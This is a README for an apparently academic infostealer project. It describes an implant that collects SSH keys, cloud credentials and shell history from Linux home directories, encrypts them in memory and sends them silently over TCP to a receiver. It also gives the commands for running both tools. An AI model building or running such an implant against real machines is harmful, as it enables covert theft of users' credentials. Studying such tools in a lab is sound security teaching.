# tmp363-infostealer

## Description
This project consists of two Python-based tools: `tmp363` (implant) and `server363` (receiver). Together, they simulate an infostealer malware that collects sensitive files from Linux user home directories and exfiltrates them to a remote server.

### tmp363 (Implant)

- Recursively scans all home directories under `/home/` for:
  - `~/.ssh/`
  - `~/.config/`
  - Cloud provider directories: `~/.aws/`, `~/.gcloud/`, `~/.azure/`
  - Shell history files matching `.*_history`

- Archives and compresses these files **in-memory** using Python’s `ZipFile` and `io.BytesIO`
- Encrypts the archive using Fernet (symmetric encryption) with a key loaded from `.env`
- Sends the encrypted archive to the server using a raw TCP socket
- Does not write anything to disk or print anything to stdout/stderr

### server363 (Receiver)

- Listens on a specified IP and port for incoming TCP connections
- Receives and decrypts the transmitted archive using the same Fernet key
- Extracts the contents to a folder named
```sh
YYYY-MM-DD:HH:MM:SS_<victim-ip>
```
- Keeps listening for the next client (handles one at a time)


## Usage

- Implant
``` sh
python3 tmp363.py <server_ip> <port>
```

- Server
``` sh
python3 server363.py <listen_ip> <port>
```

## Installation

### Prerequistes
- **Python 3.x**
- **pip** (Python package manager)


#### **Installation Steps**
1. **Clone the Repository**
  ```sh
  git clone https://github.com/kailash-anand/tmp363-infostealer.git
  cd tmp363-infostealer
  ```

2. **(Optional) Create a Virtual Environment**
  ```sh
  python3 -m venv venv
  source venv/bin/activate
  ```

3. **Install Dependencies**
  ```sh
  pip install cryptography
  pip install dotenv
  ```

## Notes
- All operations in the implant are performed in memory; no temporary files are created.
- Fernet provides authenticated symmetric encryption, ensuring confidentiality and integrity of exfiltrated data.
- The tools are intended only for academic use in controlled environments (Kali VM for CSE 363).



